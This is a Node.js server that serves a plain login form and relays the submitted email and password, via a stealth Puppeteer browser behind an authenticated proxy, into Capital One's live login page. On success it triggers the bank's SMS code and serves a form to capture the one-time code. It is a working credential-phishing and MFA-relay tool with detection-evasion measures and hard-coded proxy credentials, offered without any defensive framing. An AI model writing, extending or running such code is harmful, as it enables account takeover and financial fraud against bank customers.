const express = require("express");
const bodyParser = require("body-parser");
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");

// Add stealth plugin to Puppeteer
puppeteer.use(StealthPlugin());

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));

// Track invalid login attempts globally
let invalidAttempts = 0;
let browser, page;

// Route: Serve the login form
app.get("/", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Login</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            max-width: 500px;
            margin: 2rem auto;
            text-align: center;
          }
          input, button {
            padding: 0.5rem;
            margin: 0.5rem 0;
            font-size: 1rem;
          }
          button {
            background-color: #007bff;
            color: #fff;
            border: none;
            cursor: pointer;
          }
          button:hover {
            background-color: #0056b3;
          }
        </style>
      </head>
      <body>
        <h1>Login</h1>
        <form action="/submit-login" method="POST">
          <label>Email: <input type="text" name="email" required /></label><br/>
          <label>Password: <input type="password" name="password" required /></label><br/>
          <button type="submit">Log in</button>
        </form>
      </body>
    </html>
  `);
});

// Route: Handle login form submission
app.post("/submit-login", async (req, res) => {
  const { email, password } = req.body;

  try {
    // Launch Puppeteer browser with SOCKS5 proxy if not already launched
    if (!browser) {
      browser = await puppeteer.launch({
        headless: true, // Use non-headless mode for debugging
        args: [
          "--no-sandbox",
          "--disable-setuid-sandbox",
          "--proxy-server=http://gate.smartproxy.com:10001", // SOCKS5 proxy
        ],
      });

      page = await browser.newPage();

      // Authenticate the proxy
      await page.authenticate({
        username: "sph2tmexja",
        password: "eA5Ee1quqki7eUFg7~",
      });

      // Set a random User-Agent and headers
      await page.setUserAgent(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
      );
      await page.setExtraHTTPHeaders({
        "Accept-Language": "en-US,en;q=0.9",
        "Upgrade-Insecure-Requests": "1",
      });
    }

    console.log(`Server running at 000`);

    // Navigate to the Capital One login page
    await page.goto("https://www.capitalone.com", {
      waitUntil: "networkidle2",
      timeout: 120000, // Extend timeout to 120 seconds
    });
     
    console.log(`Server running at 00`);

    // Clear cookies and cache explicitly
    const client = await page.target().createCDPSession();
    await client.send("Network.clearBrowserCookies");
    await client.send("Network.clearBrowserCache");

    // Simulate human-like typing by clearing and entering text with delays
    await page.evaluate(() => {
      const emailField = document.querySelector('input#ods-input-0');
      if (emailField) emailField.value = "";

      const passwordField = document.querySelector('input#ods-input-1');
      if (passwordField) passwordField.value = "";
    });

    await page.type("input#ods-input-0", email, { delay: Math.random() * 200 + 50 });
    await page.type("input#ods-input-1", password, { delay: Math.random() * 200 + 50 });

    // Click the login button
    await page.evaluate(() => {
      const button = document.querySelector("button#noAcctSubmit");
      if (button) button.click();
    });

    // Wait for navigation after login attempt
    await page.waitForNavigation({ waitUntil: "networkidle2", timeout: 120000 });

    // Check for login success
    const loginSuccess = await page.evaluate(() => {
      const element = document.querySelector(
        "div.option-list-entry--message > p.message--header"
      );
      return element && element.textContent.trim() === "Text me a temporary code";
    });

    if (loginSuccess) {
      invalidAttempts = 0; // Reset invalid attempts

      // Click "Text me a temporary code"
      await page.click("div.option-list-entry--message > p.message--header");

      // Wait for "Send me the code" button
      await page.waitForSelector('button[data-testtarget="otp-button"]', { visible: true });
      await page.click('button[data-testtarget="otp-button"]');

      // Render the OTP input form
      res.send(`
        <!DOCTYPE html>
        <html lang="en">
          <head>
            <meta charset="UTF-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <title>Enter OTP</title>
            <style>
              body { font-family: Arial, sans-serif; max-width: 500px; margin: 2rem auto; text-align: center; }
              input, button { padding: 0.5rem; margin: 0.5rem 0; font-size: 1rem; }
              button { background-color: #007bff; color: #fff; border: none; cursor: pointer; }
              button:hover { background-color: #0056b3; }
            </style>
          </head>
          <body>
            <h1>Enter OTP</h1>
            <form action="/submit-otp" method="POST">
              <label>OTP: <input type="text" name="otp" maxlength="6" required /></label><br/>
              <button type="submit">Submit OTP</button>
            </form>
          </body>
        </html>
      `);
    } else {
      invalidAttempts++;
      res.send("<h1>Invalid login attempt. Please try again.</h1>");
    }
  } catch (error) {
    console.error("Error during login:", error);
    res.status(500).send("<h1>An error occurred during login.</h1>");
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
